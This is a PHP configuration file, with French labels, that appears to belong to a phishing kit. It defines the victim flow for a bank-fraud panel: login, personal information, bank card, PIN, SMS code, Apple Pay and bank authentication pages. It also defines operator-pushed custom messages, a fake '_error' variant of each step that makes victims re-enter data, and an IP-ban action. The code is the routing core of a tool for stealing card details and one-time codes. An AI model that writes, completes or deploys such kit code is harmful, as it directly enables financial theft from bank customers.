<?php

if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

$baseActions = [
    'login' => ['page' => 'login.php', 'name' => 'Connexion'],
    'infos' => ['page' => 'infos.php', 'name' => 'Informations'],
    'carte' => ['page' => 'carte.php', 'name' => 'Carte bancaire'],
    'pin' => ['page' => 'pin.php', 'name' => 'Code PIN'],    
    'sms' => ['page' => 'sms.php', 'name' => 'SMS'],
    'custom_input' => ['page' => 'custom_input.php', 'name' => 'Message personnalisé'],
    'custom_input_waiting' => ['page' => null, 'name' => 'En attente de message'],
    'waiting_custom_message' => ['page' => 'custom_input.php', 'name' => 'En attente de message'],
    'custom_message' => ['page' => 'custom_input.php', 'name' => 'Message personnalisé reçu'],
    'applepay' => ['page' => 'applepay.php', 'name' => 'Apple Pay'],
    'auth' => ['page' => 'auth.php', 'name' => 'Auth banque'],
    'success' => ['page' => 'success.php', 'name' => 'Succès'],
    'ban_ip' => ['page' => 'ban.php', 'name' => 'Bannir IP'],
];

// Fonction pour générer automatiquement les actions d'erreur
function generateErrorActions($baseActions) {
    $errorActions = [];
    foreach ($baseActions as $action => $config) {
        if (!isset($config['error'])) { // Ne pas créer d'erreur pour les actions d'erreur
            $errorActions[$action . '_error'] = [
                'page' => $config['page'],
                'name' => 'Erreur ' . $config['name'],
                'error' => true
            ];
        }
    }
    return $errorActions;
}

// Générer toutes les actions (base + erreurs)
$errorActions = generateErrorActions($baseActions);
$allActions = array_merge($baseActions, $errorActions);

// Fonction pour obtenir la configuration d'une action
function getActionConfig($action, $allActions) {
    return $allActions[$action] ?? null;
}

// Fonction pour obtenir le nom d'une action
function getActionName($action, $allActions) {
    $config = getActionConfig($action, $allActions);
    return $config['name'] ?? $action;
}

// Fonction pour obtenir la page d'une action
function getActionPage($action, $allActions) {
    $config = getActionConfig($action, $allActions);
    return $config['page'] ?? null;
}

// Fonction pour vérifier si une action est une erreur
function isErrorAction($action, $allActions) {
    $config = getActionConfig($action, $allActions);
    return isset($config['error']) && $config['error'] === true;
}
?>
